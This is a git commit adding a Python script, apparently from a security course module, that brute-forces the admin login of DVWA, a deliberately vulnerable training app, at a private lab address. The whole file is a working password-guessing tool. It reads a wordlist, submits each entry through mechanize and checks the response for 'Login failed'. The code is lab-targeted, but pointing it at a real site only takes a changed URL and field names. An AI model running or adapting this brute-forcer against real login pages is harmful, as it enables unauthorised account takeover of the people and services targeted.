a3a383f93e3e4e3d86f21f84e267fa7e432a8828
dpalbd <dpalbd@gmail.com>
2020-05-24 23:33:31 +0600

    Create  brute-force-dwva-form-itself.py

---
+++ Module -4/brute-force-dwva-form-itself.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python
+
+
+import mechanize
+import sys
+import re
+from bs4 import BeautifulSoup
+
+br = mechanize.Browser()
+
+
+response1 = br.open('http://192.168.30.143/dvwa/login.php')
+fd=open(sys.argv[1],"r")
+for line in fd.readlines():
+        passwd=(line.strip())
+        try:
+                br.select_form(nr=0)
+                br.set_value("admin", name="username", nr=0)
+                br.set_value(passwd, name="password", nr=0)
+                #print ("Checking the password :::%s " % (passwd))
+                br.submit()
+                #print br.response().read()
+                soup = BeautifulSoup(br.response().read(),'lxml')
+                content=soup.text
+                if re.search("Login failed",content):
+                        print ("Failed password is %s" %(passwd))
+                        continue
+                else:
+                        print ("Correct password is :::  %s " % (passwd))
+                        break
+        except:
+                print ("Nothing")
